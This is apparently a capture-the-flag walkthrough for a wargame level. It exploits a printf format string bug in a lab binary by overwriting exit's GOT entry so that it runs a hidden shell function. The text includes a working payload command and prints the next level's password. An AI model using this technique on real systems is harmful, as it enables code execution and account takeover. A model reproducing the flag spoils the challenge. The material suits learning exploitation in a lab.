# Level5 Walkthrough

## 🎯 Goal
Exploit a format string vulnerability to overwrite the GOT entry of `exit()` and redirect execution to the hidden `o()` function that spawns a shell.

---

## 🔍 Step 1: Binary Analysis

### main function
```asm
0x08048504 <+0>: push %ebp
0x08048505 <+1>: mov %esp,%ebp
0x08048507 <+3>: and $0xfffffff0,%esp
0x0804850a <+6>: call 0x80484c2 <n> ; Calls function n
0x0804850f <+11>: leave
0x08048510 <+12>: ret
```

### n function (vulnerable)
```asm
0x080484c2 <+0>: push %ebp
0x080484c3 <+1>: mov %esp,%ebp
0x080484c5 <+3>: sub $0x218,%esp ; Allocate 536 bytes
0x080484cb <+9>: mov 0x8049848,%eax ; stdin
0x080484d0 <+14>: mov %eax,0x8(%esp)
0x080484d4 <+18>: movl $0x200,0x4(%esp) ; Read 512 bytes
0x080484dc <+26>: lea -0x208(%ebp),%eax
0x080484e2 <+32>: mov %eax,(%esp)
0x080484e5 <+35>: call 0x80483a0 <fgets@plt> ; fgets(buffer)
0x080484ea <+40>: lea -0x208(%ebp),%eax
0x080484f0 <+46>: mov %eax,(%esp)
0x080484f3 <+49>: call 0x8048380 <printf@plt> ; VULNERABILITY!
0x080484f8 <+54>: movl $0x1,(%esp)
0x080484ff <+61>: call 0x80483d0 <exit@plt> ; Always exits
```

### o function (hidden shell)
```asm
0x080484a4 <+0>: push %ebp
0x080484a5 <+1>: mov %esp,%ebp
0x080484a7 <+3>: sub $0x18,%esp
0x080484aa <+6>: movl $0x80485f0,(%esp) ; "/bin/sh"
0x080484b1 <+13>: call 0x80483b0 <system@plt> ; system("/bin/sh")
0x080484b6 <+18>: movl $0x1,(%esp)
0x080484bd <+25>: call 0x8048390 <_exit@plt>
```

---

## 🔍 Step 2: Vulnerability Analysis

- **Format String Vulnerability:** `printf(buffer)` directly prints user input.
- **Always Exits:** Program always calls `exit()` after printf.
- **Hidden Function:** `o()` exists at `0x080484a4` → calls `system("/bin/sh")`.
- **Goal:** Overwrite the **GOT entry of exit()** (`0x08049838`) with `o()`'s address.

---

## 🔍 Step 3: GOT Address & Stack Offset

Find exit GOT entry:
```bash
objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT exit
```

Find offset in stack:
```bash
python -c 'print "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"' | ./level5
```

Output includes:
```
AAAA.200.b7fd1ac0.b7ff37d0.41414141...
```

`41414141` (`"AAAA"`) appears at **4th position** → **Offset = 4**

---

## 🔍 Step 4: Exploit Strategy

**What we need to do:**
1. **Target Address:** `0x08049838` (exit's GOT entry)
2. **Target Value:** `0x080484a4` (address of function `o`)
3. **Method:** Use `%n` to write the character count to the GOT address

**Key Insight:** 
- We need to print exactly `134513828` characters (decimal value of `0x080484a4`)
- Then use `%4$n` to write this count to the 4th stack argument (our target address)

**Address Calculation:**
- Target value: `0x080484a4` = `134,513,828` in decimal
- We place the target address first (4 bytes)
- Need to print `134,513,828 - 4 = 134,513,824` more characters
- Use `%134513824d` to pad with spaces

---

## 🔍 Step 5: Craft Payload

**Payload Structure:**
```
[target_addr][padding_format][write_specifier]
```

**Breakdown:**
- `\x38\x98\x04\x08` - GOT address of exit() (little-endian)
- `%134513824d` - Print 134,513,824 characters (spaces)  
- `%4$n` - Write total character count to 4th stack argument

**Why this works:**
1. The address `\x38\x98\x04\x08` gets placed on the stack at position 4
2. `%134513824d` prints exactly 134,513,824 spaces
3. Total characters printed: 4 (address) + 134,513,824 (spaces) = 134,513,828
4. `%4$n` writes 134,513,828 to address `0x08049838`
5. `0x080484a4` (134,513,828 in decimal) is now stored in exit's GOT entry

---

## 🚀 Step 6: Execute Exploit

```bash
(python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' ; cat -) | ./level5
```

**Command Breakdown:**
- `python -c '...'` - Generate the payload
- `; cat -` - Keep stdin open after payload to interact with shell
- `| ./level5` - Pipe to the vulnerable program

---

## 🔍 Step 7: What Happens

**Execution Flow:**
1. **Input Phase:** Program reads our payload via `fgets()`
2. **Format String Phase:** `printf(buffer)` processes our format string:
    - Prints the 4-byte address (unprintable characters)
    - Executes `%134513824d` - prints 134,513,824 spaces (takes time!)
    - Executes `%4$n` - writes 134,513,828 to `0x08049838`
3. **GOT Overwrite:** exit's GOT entry now points to function `o()` instead of exit
4. **Redirection:** When program calls `exit(1)`, it actually calls `o()`
5. **Shell Spawn:** Function `o()` executes `system("/bin/sh")`

**Memory State After Exploit:**
```
Before: 0x08049838 → exit() function
After:  0x08049838 → o() function (0x080484a4)
```

---

## 🎯 Step 8: Get the Password

After the exploit runs and you see the shell prompt:
```bash
$ whoami
level6
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

---

## 🎉 Success!

You now have a shell as **level6**.

---

> **Note:**  
> This exploit does not rely on a buffer overflow. Instead, it abuses the format string vulnerability in printf. By carefully crafting the input, we place the address of the exit() GOT entry onto the stack at a specific position, determined by the format string offset. When `%n` is processed, it writes the total number of characters printed so far into that memory location, effectively overwriting the GOT entry of exit() with the address of the hidden `o()` function. After the overwrite, when the program calls `exit()`, the CPU looks up the address in the GOT and instead jumps to `o()`, which executes `system("/bin/sh")` and gives a shell. This technique hijacks program flow by exploiting the behavior of printf and the dynamic linking mechanism, without needing to overflow any buffers.
